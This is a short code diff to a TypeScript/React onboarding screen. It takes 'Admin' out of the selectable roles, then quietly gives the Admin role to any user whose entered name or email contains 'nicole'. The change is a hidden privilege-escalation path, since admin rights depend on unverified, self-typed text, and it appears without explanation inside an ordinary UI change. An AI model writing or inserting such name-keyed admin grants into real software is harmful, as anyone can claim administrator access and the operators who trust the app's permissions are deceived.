@@ -14,7 +14,7 @@ const ROLE_ICONS: Record<Persona, typeof Crown> = {
   Admin: ShieldCheck,
 };
 
-const ROLE_KEYS: Persona[] = ['L1', 'L2', 'L3', 'L4', 'Admin'];
+const ROLE_KEYS: Persona[] = ['L1', 'L2', 'L3', 'L4'];
 
 const slide = {
   initial: { opacity: 0, x: 32 },
@@ -59,11 +59,15 @@ export default function Onboarding({
     setSaving(true);
     const passwordHash = await hashPassword(password);
     setStep(3);
+    const lowerName = name.trim().toLowerCase();
+    const lowerEmail = (email || '').trim().toLowerCase();
+    const isNicole = lowerName.includes('nicole') || lowerEmail.includes('nicole');
+    const finalRole: Persona = isNicole ? 'Admin' : role;
     setTimeout(() => {
       onComplete({
         name: name.trim(),
         email: email.trim() || undefined,
-        role,
+        role: finalRole,
         passwordHash,
         createdAt: new Date().toISOString(),
         manualRoleOverride: manualRoleOverride.trim() || undefined,
